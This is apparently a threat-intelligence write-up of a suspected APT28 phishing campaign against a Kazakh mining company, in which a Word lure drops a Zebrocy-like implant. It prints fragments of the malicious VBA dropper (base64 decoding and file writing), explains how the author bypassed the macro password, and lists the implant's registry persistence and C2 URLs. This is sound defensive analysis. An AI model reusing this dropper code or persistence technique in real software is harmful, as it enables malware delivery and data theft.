Summary
APT28 (also commonly known as FancyBear, STRONTIUM, Sednit, Sofacy, and more) is a
threat group that has been attributed to Russia’s Main Intelligence Directorate of the Russian
General Staff by a July 2018 U.S. Department of Justice indictment. The group has been
regarded as being active since at least 2004, and is espionage motivated. It’s targets have
included the private sector, military, and governments across the world. In this post, I will
review a campaign that I believe to have been conducted by APT28.

Analysis
While performing research, I came across an interesting document titled
“gorodpavlodar.doc”. This document was an attachment within an equally as interesting
email - this email was sent to multiple individuals who, as far as my research indicates, work
for a large mining corporation with operations located in Kazakhstan. The email purports to
be sent from the “OFFICIAL RESOURCE OF THE CITY OF PAVLODAR”, but is actually sent
by the address “pavlodar.news@bk.ru”. Pavlodar is a city in northeastern Kazakhstan and
the capital of the Pavlodar Region. The original email and translation are listed below, which
prompts the recipient of the email to review the attached document.

To date, 240 multi-storey residential buildings remain without hot water,
reports correspondent pavlodarnews.kz.
From May 13 to 19, Pavlodar Heating Networks LLP conducted hydraulic tests on
heat supply engineering networks in the northern part of the city. 84 injuries were
identified, in
In connection with this, 240 multi-storey residential buildings remain without hot
water supply.

The attached document also contained text written in Russian, which translated roughly to
“Schedule of connecting your residential house to hot water supply” and purported to be from
the “Official Internet Resource of Akimat City Pavlodar”. The document appeared to be a

form for the recipients to fill out with their address, date of water elimination, and reason for
lack of hot water. It also prompts the recipient to enable Editing/Content to view the
“protected” document.

Shown above: Suspected APT28 Lure “gorodpavlodar.doc”
Opening the Visual Basic console via the developer tab in Word reveals a password
protected project that would be run if content were enabled. To bypass this password
restriction, I opened the document within a Hex editor and searched for the string “DPB=”
which contains the VBA password, and changed it to “DPx=”. Opening the project following
this causes Word to throw multiple errors regarding the invalid key (DPx), but allows me to

bypass the password restriction. This allows me to view the contents of the project, displayed
below, which looks to be a UserForm containing quite a lot of data in two of the input boxes,
in addition to some labels.

Shown above: Suspected APT28 Lure VBA Project
If I extract the embedded macro, I can see that it essentially does two things - create two
files (graphic.doc and libssl.exe) from the code embedded within the VBA project, and drops
those files in the “C:\Users\[username]\AppData\Roaming" directory.

qw.Visible = True

End Sub
Private Function drgvfdhre(tyruyt)
Dim fghfhggjj, asddf
Set fghfhggjj = CreateObject("Microsoft.XMLDOM")
Set asddf = fghfhggjj.createElement("tmp")
asddf.dataType = "bin.base64"
asddf.Text = tyruyt
drgvfdhre = asddf.nodeTypedValue
End Function
Private Sub vbnbnm(tgbyh, edcrf)

Set qsxx = CreateObject("ADODB.Stream")
qsxx.Type = 1
qsxx.Open
qsxx.Write edcrf
qsxx.SaveToFile tgbyh, 2
End Sub

Shown above: Macro within gorodpavlodar.doc
Following execution of the macro, the original document is deleted and the secondary
document “graphic.doc” is opened. This document appears to be a “completed” version of
the form contained within the original document, and also contains an embedded macro that
executes the aforementioned executable “libssl.exe”.

Shown above: graphic.doc
Following execution of “libssl.exe”, it will modify the registry to maintain persistence
(HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run). It will then
initiate Command & Control communications to two hard-coded URL’s via HTTP POST
requests - www.gorodpavlodar.kz/modules/Contact/Includes/1c.php and
www.gorodpavlodar.kz/modules/Contact/Includes/2c.php, along with a hard-coded UserAgent string “Mozilla/5.0 (Windows NT 10.0; Win64; x64)”. The information POST’d includes
URL encoded host information - such as a unique ID, drive information, hostname, OS,
username, bios, date, process listing, and more. In the past, these POST requests would
receive binary data in the server responses, but they are now being met with 404 HTTP
responses.

Shown above: Suspected Zebrocy Implant C2 network capture
While I will leave the in-depth malware analysis to those more adept, the observed activity
related to the binary up to this point is very reminiscent of APT28’s “Zebrocy” implant.
Furthermore, static analysis of the binary reveals numerous similarities to other documented
Zebrocy samples - particularly the one documented here by Vitali Kremez. While this isn’t
conclusive evidence that APT28 is responsible for this sample, the similarities between it and
other confirmed Zebrocy implants, in addition to the fact that Kazakhstan has historically
been targeted by APT28, is quite suspect. Regardless, it was an interesting sample to review
and gives insight into potential economic espionage activities.
